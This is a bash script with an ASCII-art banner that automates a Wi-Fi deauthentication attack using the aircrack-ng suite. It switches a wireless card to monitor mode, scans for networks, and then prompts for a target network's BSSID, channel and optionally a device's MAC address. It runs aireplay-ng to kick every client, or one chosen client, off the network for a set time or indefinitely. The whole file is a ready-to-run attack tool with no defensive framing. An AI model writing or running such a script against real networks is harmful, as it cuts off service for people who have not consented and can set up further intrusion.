#!/bin/bash

#Intro
clear
echo
echo
echo ──────▄▀▄─────▄▀▄
echo ─────▄█░░▀▀▀▀▀░░█▄
echo ─▄▄──█░░░░░░░░░░░█──▄▄
echo █▄▄█─█░░▀░░┬░░▀░░█─█▄▄█
echo
echo ░██╗░░░░░░░██╗███████╗██╗░░░░░░█████╗░░█████╗░███╗░░░███╗███████╗
echo ░██║░░██╗░░██║██╔════╝██║░░░░░██╔══██╗██╔══██╗████╗░████║██╔════╝
echo ░╚██╗████╗██╔╝█████╗░░██║░░░░░██║░░╚═╝██║░░██║██╔████╔██║█████╗░░
echo ░░████╔═████║░██╔══╝░░██║░░░░░██║░░██╗██║░░██║██║╚██╔╝██║██╔══╝░░
echo ░░╚██╔╝░╚██╔╝░███████╗███████╗╚█████╔╝╚█████╔╝██║░╚═╝░██║███████╗
echo ░░░╚═╝░░░╚═╝░░╚══════╝╚══════╝░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚══════╝

echo ░██████╗██╗░░░██╗██████╗░███████╗██████╗░░█████╗░██╗░░░██╗░██████╗░███████╗███████╗░█████╗░██████╗░
echo ██╔════╝██║░░░██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██║░░░██║██╔════╝░██╔════╝██╔════╝██╔══██╗╚════██╗
echo ╚█████╗░██║░░░██║██████╔╝█████╗░░██████╔╝██║░░██║██║░░░██║██║░░██╗░█████╗░░██████╗░██║░░██║░░███╔═╝
echo ░╚═══██╗██║░░░██║██╔══██╗██╔══╝░░██╔══██╗██║░░██║██║░░░██║██║░░╚██╗██╔══╝░░╚════██╗██║░░██║██╔══╝░░
echo ██████╔╝╚██████╔╝██║░░██║███████╗██║░░██║╚█████╔╝╚██████╔╝╚██████╔╝███████╗██████╔╝╚█████╔╝███████╗
echo ╚═════╝░░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═════╝░░╚════╝░╚══════╝
echo
echo
name="$USER"
echo Welcome $name
echo



#Wifite in Monitor Mode
echo Wireless Card Name:
read wc
airmon-ng start $wc
airmon-ng check
sleep 2
airmon-ng check kill
airmon-ng check
sleep 5
clear


#Operation details output:
echo Re-Enter Wireless Card Name After Being put In Monitored mode  -type ifconfig In new Terminal to know --- Type the Same Name when nothing visible In ifconfig
read wcm
echo Press Ctrl+c when u find your Network
sleep 2

sudo airodump-ng $wcm
sleep 2
$?


#Detect Devices:
echo BSSID of Network? :
read bssid
echo channel of Network? :
read c

#Channel change(IMPORTANT):
iwconfig $wcm channel $c


echo Would you like to Kick Everyone OFF or a Specific Device?
echo 0 when ALL    1 when specific Device
read Q
echo For How Long would you like to kick them off?
echo Limited period of Time will allow the Script to auto-resume Network Services, Else You will have to restart network on your own
echo Enter 0 For indefinite period of Time or Enter the period of timE
read t

#If Else
if [ $Q -eq 0 ]
then
echo kicking all
sudo aireplay-ng -0 $t -a $bssid $wcm
else
echo kicking 1
sudo airodump-ng --bssid $bssid -c $c $wcm
echo Device Mac Address to Kick:
read mac
echo Operation Will commence now ...
echo Ctrl+C to end operation at anytime
sleep 3
sudo aireplay-ng -0 $t -a $bssid -c $mac $wcm
sleep 2
echo Operation Ended
fi

#Reboot Network Services
sleep 2
echo Rebooting Network Services
sudo airmon-ng stop $wcm
service networking restart
service NetworkManager restart
echo Networking Online...
sleep 3


